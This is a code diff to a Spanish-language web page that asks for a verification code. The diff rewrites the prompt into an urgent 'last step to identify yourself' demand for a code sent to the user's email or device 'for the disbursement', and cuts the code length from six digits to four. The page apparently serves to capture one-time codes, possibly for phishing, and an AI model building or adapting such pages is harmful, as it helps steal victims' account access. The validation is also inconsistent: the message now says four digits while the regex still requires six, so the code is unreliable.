@@ -58,7 +58,7 @@
     }
 
     button {
-      background: #7035ee;
+      background: #F54927;
       color: white;
       padding: 0.75rem 2rem;
       border: none;
@@ -82,13 +82,13 @@
 </head>
 <body>
   <div class="screen">
-    <h3>Te enviaremos un código SMS a tu celular</h3>
-    <p>Introduce el código de verificación que te acabamos de enviar.</p>
+    <h3>¡ULTIMO PASO PARA IDENTIFICARTE!</h3>
+    <p>Coloca correctamente el codigo de asociacion que hemos enviado a tu correo electronico o dispositivo de confianza para asi identificarte y realizar el desembolso.</p>
     
     <!-- Campo único -->
     <div class="input-group campo-requerido">
       <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
+      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="4" maxlength="4" required>
     </div>
 
     <p class="mensaje-error">Código inválido. Por favor, ingréselo correctamente.</p>
@@ -111,7 +111,7 @@
       }
 
       if (!/^\d{6}$/.test(codigo)) {
-        alert("El código debe tener exactamente 6 dígitos numéricos.");
+        alert("El código debe tener exactamente 4 dígitos numéricos.");
         return;
       }
 
